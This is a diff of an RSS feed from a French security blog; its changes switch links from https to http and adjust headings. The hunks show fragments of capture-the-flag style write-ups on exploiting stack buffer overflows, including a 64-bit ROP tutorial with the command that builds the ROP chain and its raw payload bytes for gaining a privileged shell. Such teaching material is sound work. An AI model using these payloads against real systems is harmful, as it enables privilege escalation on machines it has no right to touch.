@@ -2,23 +2,23 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>ngup, stfu, rtfm &amp; KISS</title>
-    <link>https://unix4fun.github.io/</link>
+    <link>http://unix4fun.github.io/</link>
     <description>Recent content on ngup, stfu, rtfm &amp; KISS</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>&amp;copy; unix4fun 2016.&lt;br&gt;All rights reserved.</copyright>
     <lastBuildDate>Mon, 03 Oct 2016 10:48:10 +0200</lastBuildDate>
-    <atom:link href="https://unix4fun.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <atom:link href="http://unix4fun.github.io/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
       <title>Exploiter un binaire 64 bits sous Linux via ROP</title>
-      <link>https://unix4fun.github.io/post/howto-rop-en-64bits/</link>
+      <link>http://unix4fun.github.io/post/howto-rop-en-64bits/</link>
       <pubDate>Mon, 03 Oct 2016 10:48:10 +0200</pubDate>
       
-      <guid>https://unix4fun.github.io/post/howto-rop-en-64bits/</guid>
+      <guid>http://unix4fun.github.io/post/howto-rop-en-64bits/</guid>
       <description>
 
-&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
 
 &lt;p&gt;Bon ben dans la même veine que le post précedent, je vais tâcher d&amp;rsquo;expliquer comment exploiter un buffer overflow sur la pile, en utilisant la méthode de Return-Oriented Programming.  Cette technique est utilise quand la pile n&amp;rsquo;est pas exécutable, l&amp;rsquo;idée étant de sauter dans une portion de code qui l&amp;rsquo;est, et petit à petit, reconstruire un flot d&amp;rsquo;exécution qui mène à&amp;hellip; obtenir un shell avec des droits plus importants, dans le cas présent.&lt;/p&gt;
 
@@ -101,7 +101,7 @@ $
 
 &lt;p&gt;Oookay, rien d&amp;rsquo;intéressant.   Vraiment?&lt;/p&gt;
 
-&lt;h1 id=&#34;tentative-de-ret2libc&#34;&gt;Tentative de ret2libc&lt;/h1&gt;
+&lt;h2 id=&#34;tentative-de-ret2libc&#34;&gt;Tentative de ret2libc&lt;/h2&gt;
 
 &lt;p&gt;Il y a peut-être moyen de rendre la stack exécutable grâce à &lt;code&gt;mprotect()&lt;/code&gt; (&lt;code&gt;_dl_make_stack_executable&lt;/code&gt; nous y a fait fortement penser), puis de sauter à l&amp;rsquo;adresse d&amp;rsquo;un shellcode qu&amp;rsquo;on aurait mis dans le buffer du programme, ou dans une variable d&amp;rsquo;environnement.&lt;/p&gt;
 
@@ -192,7 +192,7 @@ gdb$ ni
 Bien!  Est-ce qu&#39;on peut mettre les arguments voulus dans les registres idoines, maintenant?  Je ne vois pas comment faire, arrivé à ce stade.  C&#39;est malin, j&#39;aurais dû y penser plus tôt.  Ca a l&#39;air compromis, de ne faire que du ret2libc.  Va falloir passer par du ROP.
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h1 id=&#34;bon-ben-rop&#34;&gt;Bon&amp;hellip; ben ROP.&lt;/h1&gt;
+&lt;h2 id=&#34;bon-ben-rop&#34;&gt;Bon&amp;hellip; ben ROP.&lt;/h2&gt;
 
 &lt;p&gt;L&amp;rsquo;objectif est de trouver des séquences d&amp;rsquo;instructions dans la zone exécutable de la mémoire du processus, afin de les emboîter petit à petit pour arriver à une succession d&amp;rsquo;opérations qui feront quelque chose de particulier.  En l&amp;rsquo;occurrence, obtenir un shell avec les droits privilégiés.&lt;/p&gt;
 
@@ -301,9 +301,8 @@ if __name__ == &amp;quot;__main__&amp;quot;:
 ^D
 
 $ sc=$(ropchain.py 280); export sc=${sc:2:-1}; echo $sc
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\x00\x00\x9f\xbdA\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x000\xec@\x00\x00\x00\x00\x00\x00&amp;lt;I\x00\x00\x00\x00\x00\xe7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa7\x81K\x00\x00\x00\x00\x00&#39;\xe9J\x00\x00\x00\x00\x00
 &lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB\x00\x00\x9f\xbdA\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x00\x10\xaaE\x00\x00\x00\x00\x000\xec@\x00\x00\x00\x00\x00\x00&amp;lt;I\x00\x00\x00\x00\x00\xe7\x17@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05rC\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa7\x81K\x00\x00\x00\x00\x00&amp;rsquo;\xe9J\x00\x00\x00\x00\x00&lt;/p&gt;
 
 &lt;p&gt;NOTE:  le &lt;code&gt;${sc:2:-1}&lt;/code&gt; permet de se débarrasser du &lt;code&gt;b&amp;quot;&lt;/code&gt; en début de chaîne et &lt;code&gt;&amp;quot;&lt;/code&gt; en fin de chaîne.  Il y a sûrement moyen de faire ça intelligemment mais je suis une bille en python, et j&amp;rsquo;avais pas de temps à perdre là-dessus!&lt;/p&gt;
 
@@ -449,10 +448,10 @@ CeciEstMonFlagTagadaTsoinTsoin!
     
     <item>
       <title>On est sur Github Pages!!! rholallalala</title>
-      <link>https://unix4fun.github.io/post/on-est-sur-githubpages/</link>
+      <link>http://unix4fun.github.io/post/on-est-sur-githubpages/</link>
       <pubDate>Sun, 02 Oct 2016 10:48:23 +0200</pubDate>
       
-      <guid>https://unix4fun.github.io/post/on-est-sur-githubpages/</guid>
+      <guid>http://unix4fun.github.io/post/on-est-sur-githubpages/</guid>
       <description>&lt;p&gt;Tout est dit!&lt;/p&gt;
 
 &lt;p&gt;On utilise donc &lt;a href=&#34;https://gohugo.io/&#34;&gt;Hugo&lt;/a&gt; et on hoste sur &lt;a href=&#34;https://pages.github.com/&#34;&gt;GitHub Pages&lt;/a&gt;.&lt;/p&gt;
@@ -465,10 +464,10 @@ CeciEstMonFlagTagadaTsoinTsoin!
     
     <item>
       <title>Exploiter un stack overflow à l&#39;ancienne.</title>
-      <link>https://unix4fun.github.io/post/exploiter-un-stack-overflow/</link>
+      <link>http://unix4fun.github.io/post/exploiter-un-stack-overflow/</link>
       <pubDate>Fri, 23 Sep 2016 07:38:13 +0200</pubDate>
       
-      <guid>https://unix4fun.github.io/post/exploiter-un-stack-overflow/</guid>
+      <guid>http://unix4fun.github.io/post/exploiter-un-stack-overflow/</guid>
       <description>&lt;p&gt;Youpla la compagnie! Ça fait un bail non? :) Bon, récemment je me suis mis à regarder un peu les vieilles failles de sécu des années 90&amp;rsquo;/début 2000. Ok ok, de nos jours c&amp;rsquo;est complètement différent, on a des milliards de protections (PIE, ASLR, relro, stack canary, etc). Mais pour ma culture générale, j&amp;rsquo;ai voulu regarder. J&amp;rsquo;ai donc cherché sur google un site proposant des challenges, et je suis tombé sur l&amp;rsquo;un d&amp;rsquo;eux qui est vraiment bien fichu: il propose une dizaine de catégories (web, cryptanalyse, crackme, exploitation système, etc). Il propose de se connecter sur des machines où l&amp;rsquo;environnement est déjà préparé, etc.&lt;/p&gt;
 
 &lt;p&gt;NOTE: je ne le nomme pas, non pas pour ne pas faire de la publicité, mais parce qu&amp;rsquo;en traînant un peu mes guêtre par là, les administrateurs n&amp;rsquo;aiment pas trop que les solutions se trouvent trop facilement sur le net. Donc je vais tenter de rendre la recherche de solution un peu plus compliquée tout en restant cohérent (j&amp;rsquo;espère).&lt;/p&gt;
@@ -744,10 +743,10 @@ Tirelipimponsurlechiwawa!
     
     <item>
       <title>about unix4fun</title>
-      <link>https://unix4fun.github.io/about/</link>
+      <link>http://unix4fun.github.io/about/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>https://unix4fun.github.io/about/</guid>
+      <guid>http://unix4fun.github.io/about/</guid>
       <description>
 
 &lt;h1 id=&#34;what&#34;&gt;what?!&lt;/h1&gt;
